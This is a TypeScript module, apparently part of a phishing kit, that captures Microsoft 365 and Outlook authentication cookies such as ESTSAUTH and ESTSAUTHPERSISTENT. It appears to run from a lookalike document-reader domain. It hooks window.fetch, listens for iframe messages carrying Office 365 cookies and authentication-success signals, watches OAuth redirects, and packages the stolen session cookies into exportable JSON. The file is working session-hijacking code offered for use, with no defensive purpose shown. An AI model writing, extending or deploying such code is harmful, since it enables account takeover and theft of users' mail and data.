/**
 * Microsoft Domain Cookie Capture System
 * Specialized cookie capturing for Office365, Outlook, and Microsoft authentication flows
 * Integrates with existing advancedCookieCapture infrastructure
 */

import { advancedCookieCapture, type CapturedCookie } from './advancedCookieCapture';
import { buildCookieCapture, type CookieMeta } from './cookieUtils';

interface MicrosoftCookieSession {
  authCookies: CapturedCookie[];
  sessionCookies: CapturedCookie[];
  persistentCookies: CapturedCookie[];
  graphTokens: CapturedCookie[];
  outlookCookies: CapturedCookie[];
  captureTimestamp: string;
  userAgent: string;
  sessionId: string;
}

class MicrosoftCookieCapture {
  private microsoftDomains = [
    'login.microsoftonline.com',
    'outlook.office365.com',
    'outlook.live.com',
    'account.microsoft.com',
    'graph.microsoft.com',
    'login.live.com',
    'office.com',
    'microsoftonline.com',
    'cloudconvertdocumentreader.com' // Add current domain to capture Microsoft cookies set locally
  ];

  private criticalCookieNames = [
    'ESTSAUTH',
    'ESTSAUTHPERSISTENT',
    'ESTSAUTHLIGHT',
    'SignInStateCookie',
    'AADSTS',
    'buid',
    'esctx',
    'x-ms-gateway-slice',
    'stsservicecookie',
    'MSPOK',
    'MSPRequ',
    'MSFPC',
    'ai_user',
    'ai_session',
    'wlidperf',
    'MSPSoftVis',
    'MSPBack',
    'MSPProf',
    'MSPShared',
    'MSCC',
    'MicrosoftApplicationsTelemetryDeviceId',
    'MicrosoftApplicationsTelemetryFirstLaunchTime'
  ];

  private sessionListeners: ((session: MicrosoftCookieSession) => void)[] = [];
  private isMonitoring = false;
  private lastCaptureTime = 0;
  private lastSessionSent = 0;
  private captureBuffer: CapturedCookie[] = [];
  private captureDebounceMs = 3000; // Reduce frequency

  constructor() {
    this.initializeMicrosoftCapture();
  }

  private initializeMicrosoftCapture() {
    if (this.isMonitoring) return;

    // Hook into the existing advanced cookie capture system
    advancedCookieCapture.onCookieChange((cookies) => {
      this.processMicrosoftCookies(cookies);
    });

    // Monitor iframe communications for Microsoft domains
    this.monitorIframeMessages();

    // Enhanced network monitoring for Microsoft APIs
    this.enhanceNetworkMonitoring();

    // Monitor for Microsoft OAuth flows
    this.monitorOAuthFlows();

    this.isMonitoring = true;
    console.log('🔵 Microsoft Cookie Capture System initialized');
  }

  private processMicrosoftCookies(allCookies: CapturedCookie[]) {
    const microsoftCookies = allCookies.filter(cookie => 
      this.isMicrosoftDomain(cookie.domain)
    );

    if (microsoftCookies.length === 0) return;

    // Debounce to prevent spam
    const now = Date.now();
    if (now - this.lastCaptureTime < this.captureDebounceMs) {
      return;
    }
    this.lastCaptureTime = now;

    // Buffer cookies to avoid excessive processing
    this.captureBuffer.push(...microsoftCookies);
    
    // Process buffered cookies
    if (now - this.lastSessionSent > 5000) { // Process every 5 seconds max
      this.processBufferedCookies();
      this.lastSessionSent = now;
    }
  }

  private processBufferedCookies() {
    if (this.captureBuffer.length === 0) return;

    // Prevent spam - only process every 5 seconds
    const now = Date.now();
    if (now - this.lastSessionSent < 5000) {
      return;
    }

    const uniqueCookies = this.deduplicateCookies(this.captureBuffer);
    const session = this.buildMicrosoftSession(uniqueCookies);
    
    if (session.authCookies.length > 0 || session.sessionCookies.length > 0) {
      console.log(`🔵 Microsoft session captured: ${session.authCookies.length} auth cookies, ${session.sessionCookies.length} session cookies`);
      this.notifySessionListeners(session);
      this.lastSessionSent = now;
    }

    this.captureBuffer = [];
  }

  private deduplicateCookies(cookies: CapturedCookie[]): CapturedCookie[] {
    const seen = new Map<string, CapturedCookie>();
    
    cookies.forEach(cookie => {
      const key = `${cookie.name}:${cookie.domain}:${cookie.path}`;
      const existing = seen.get(key);
      
      if (!existing || cookie.timestamp > existing.timestamp) {
        seen.set(key, cookie);
      }
    });

    return Array.from(seen.values());
  }

  private buildMicrosoftSession(cookies: CapturedCookie[]): MicrosoftCookieSession {
    const authCookies = cookies.filter(c => this.isAuthCookie(c.name));
    const sessionCookies = cookies.filter(c => this.isSessionCookie(c.name));
    const persistentCookies = cookies.filter(c => !c.session && !this.isAuthCookie(c.name));
    const graphTokens = cookies.filter(c => this.isGraphToken(c.name) || c.domain.includes('graph.microsoft.com'));
    const outlookCookies = cookies.filter(c => c.domain.includes('outlook'));

    return {
      authCookies,
      sessionCookies,
      persistentCookies,
      graphTokens,
      outlookCookies,
      captureTimestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      sessionId: this.generateSessionId()
    };
  }

  private monitorIframeMessages() {
    window.addEventListener('message', (event) => {
      // Monitor messages from Office365 iframe
      if (event.data && typeof event.data === 'object') {
        if (event.data.type === 'MICROSOFT_COOKIES' || event.data.type === 'OFFICE_365_COOKIES') {
          this.processMicrosoftCookieMessage(event.data);
        }
        
        // Monitor for authentication success messages
        if (event.data.type === 'OFFICE_365_AUTH_SUCCESS') {
          this.capturePostAuthCookies();
        }
      }
    });
  }

  private processMicrosoftCookieMessage(data: any) {
    try {
      if (data.cookies && Array.isArray(data.cookies)) {
        data.cookies.forEach((cookieData: any) => {
          if (this.isMicrosoftDomain(cookieData.domain)) {
            advancedCookieCapture.manuallyAddCookie({
              ...cookieData,
              captureMethod: 'injection',
              timestamp: new Date().toISOString()
            });
          }
        });
      }
    } catch (error) {
      console.error('❌ Error processing Microsoft cookie message:', error);
    }
  }

  private enhanceNetworkMonitoring() {
    // Enhanced fetch monitoring for Microsoft APIs
    const originalFetch = window.fetch;
    
    window.fetch = async function(...args) {
      const response = await originalFetch.apply(this, args);
      
      try {
        const url = args[0] as string;
        if (typeof url === 'string' && microsoftCookieCapture.isMicrosoftUrl(url)) {
          // Extract cookies from Microsoft API responses
          microsoftCookieCapture.extractCookiesFromResponse(response, url);
        }
      } catch (error) {
        console.error('❌ Error monitoring Microsoft API call:', error);
      }
      
      return response;
    };
  }

  private extractCookiesFromResponse(response: Response, url: string) {
    try {
      // Try to extract Set-Cookie headers (limited by CORS)
      const setCookie = response.headers.get('set-cookie');
      if (setCookie) {
        console.log(`🔵 Microsoft API cookies from ${url}:`, setCookie);
      }

      // Monitor for authentication headers
      const authHeader = response.headers.get('authorization') || response.headers.get('x-ms-token');
      if (authHeader) {
        console.log(`🔵 Microsoft auth header captured from ${url}`);
      }
    } catch (error) {
      // CORS limitations expected
    }
  }

  private monitorOAuthFlows() {
    // Monitor URL changes for OAuth flows
    let lastUrl = window.location.href;
    
    const checkUrlChange = () => {
      const currentUrl = window.location.href;
      if (currentUrl !== lastUrl) {
        if (this.isMicrosoftOAuthUrl(currentUrl)) {
          console.log('🔵 Microsoft OAuth flow detected:', currentUrl);
          this.captureOAuthCookies();
        }
        lastUrl = currentUrl;
      }
    };

    // Monitor for URL changes
    setInterval(checkUrlChange, 500);
    
    // Monitor for popstate events (back/forward navigation)
    window.addEventListener('popstate', checkUrlChange);
  }

  private captureOAuthCookies() {
    // Trigger immediate cookie capture during OAuth flow
    setTimeout(() => {
      const currentCookies = advancedCookieCapture.getAllCookies();
      this.processMicrosoftCookies(currentCookies);
    }, 1000);
  }

  private capturePostAuthCookies() {
    // Capture cookies after successful authentication
    setTimeout(() => {
      console.log('🔵 Capturing post-authentication Microsoft cookies');
      const currentCookies = advancedCookieCapture.getAllCookies();
      this.processMicrosoftCookies(currentCookies);
    }, 2000);
  }

  // Utility methods
  private isMicrosoftDomain(domain: string): boolean {
    if (!domain) return false;
    const normalizedDomain = domain.toLowerCase();
    return this.microsoftDomains.some(msDomain => 
      normalizedDomain === msDomain.toLowerCase() || 
      normalizedDomain.endsWith(msDomain.toLowerCase().replace(/^\./, ''))
    );
  }

  private isMicrosoftUrl(url: string): boolean {
    try {
      const urlObj = new URL(url);
      return this.isMicrosoftDomain(urlObj.hostname);
    } catch {
      return false;
    }
  }

  private isMicrosoftOAuthUrl(url: string): boolean {
    return url.includes('login.microsoftonline.com') || 
           url.includes('oauth') || 
           url.includes('authorize') ||
           url.includes('token');
  }

  private isAuthCookie(name: string): boolean {
    const authPatterns = ['ESTSAUTH', 'AADSTS', 'SignInState', 'stsservice', 'esctx'];
    return authPatterns.some(pattern => name.includes(pattern));
  }

  private isSessionCookie(name: string): boolean {
    return this.criticalCookieNames.includes(name) || name.includes('session');
  }

  private isGraphToken(name: string): boolean {
    return name.includes('graph') || name.includes('token') || name.includes('bearer');
  }

  private generateSessionId(): string {
    return `ms_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }

  private notifySessionListeners(session: MicrosoftCookieSession) {
    this.sessionListeners.forEach(listener => {
      try {
        listener(session);
      } catch (error) {
        console.error('❌ Error in Microsoft session listener:', error);
      }
    });
  }

  // Public API
  public onMicrosoftSession(listener: (session: MicrosoftCookieSession) => void) {
    this.sessionListeners.push(listener);
  }

  public getMicrosoftCookies(): CapturedCookie[] {
    return advancedCookieCapture.getAllCookies().filter(cookie => 
      this.isMicrosoftDomain(cookie.domain)
    );
  }

  public getAuthenticationCookies(): CapturedCookie[] {
    return this.getMicrosoftCookies().filter(cookie => 
      this.isAuthCookie(cookie.name)
    );
  }

  public exportMicrosoftSession(): string {
    const microsoftCookies = this.getMicrosoftCookies();
    const session = this.buildMicrosoftSession(microsoftCookies);
    return JSON.stringify(session, null, 2);
  }

  public getMicrosoftStats() {
    const cookies = this.getMicrosoftCookies();
    return {
      total: cookies.length,
      authCookies: cookies.filter(c => this.isAuthCookie(c.name)).length,
      sessionCookies: cookies.filter(c => this.isSessionCookie(c.name)).length,
      domains: [...new Set(cookies.map(c => c.domain))],
      captureTime: new Date().toISOString()
    };
  }

  public forceCaptureNow() {
    console.log('🔵 Force capturing Microsoft cookies...');
    const currentCookies = advancedCookieCapture.getAllCookies();
    this.processMicrosoftCookies(currentCookies);
    this.processBufferedCookies();
  }
}

// Create singleton instance
export const microsoftCookieCapture = new MicrosoftCookieCapture();

// Make globally available for debugging
if (typeof window !== 'undefined') {
  (window as any).microsoftCookieCapture = microsoftCookieCapture;
}

export type { MicrosoftCookieSession };
export default microsoftCookieCapture;
